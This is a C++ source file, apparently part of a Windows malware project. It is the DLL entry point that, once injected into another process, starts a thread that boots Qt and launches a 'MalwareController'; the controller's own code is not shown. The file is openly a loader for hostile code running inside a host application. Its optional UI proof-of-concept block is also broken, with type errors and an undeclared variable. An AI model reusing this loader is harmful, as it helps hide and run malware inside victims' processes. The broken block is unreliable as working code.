#include <memory>
#include <Windows.h>

#include <QCoreApplication>

#include "../SharedKernel/Controllers/malwarecontroller.h"

#ifdef UI_PROOF_OF_CONCEPT
#include <QPushButton>
#endif

std::unique_ptr<QCoreApplication> app;
std::unique_ptr<controllers::MalwareController> controller;

/**
 * @brief Starts the malware logic.
 */
void WINAPI startMalware()
{
    int argc = 0;
    app = std::make_unique<QCoreApplication>(argc, (char**) nullptr);

    controller = std::make_unique<controllers::MalwareController>();
    controller->start();
}

/**
 * @brief Starts the graphic interface.
 * @remarks This function is only here as a proof of concept to start a UI.
 */
void WINAPI startUi()
{
#ifdef UI_PROOF_OF_CONCEPT
    int argc = 0;
    QApplication app = new QApplication(argc, NULL);

    button = new QPushButton();
    QObject::connect(button, SIGNAL(clicked(bool)), app, SLOT(aboutQt()));
    button->setText("About Qt");
    button->show();
    app->exec();
#endif
}

/**
 * @brief The thread started by the DLL injection in order to start Qt environment.
 */
void WINAPI qtThread()
{
    // Indicate where the Qt plugins are located
    QCoreApplication::addLibraryPath("C:\\Qt");

    startMalware();
}

/**
 * @brief The entry point of the DLL that starts the malware code.
 * @param hinstDLL handle to DLL module
 * @param fdwReason reason for calling function
 * @param lpReserved reserved
 * @return Returns TRUE if the injection succeed, otherwise FALSE.
 * @see https://msdn.microsoft.com/en-us/library/windows/desktop/ms682596(v=vs.85).aspx
 */
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            // Disable the call of the event for threads attach/detach
            DisableThreadLibraryCalls(hinstDLL);

            // Start a new thread to handle Qt code
            if ( CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)qtThread, NULL, 0, NULL) == NULL ) {
                return FALSE;
            }

            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            controller->stop();
            break;
    }

    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
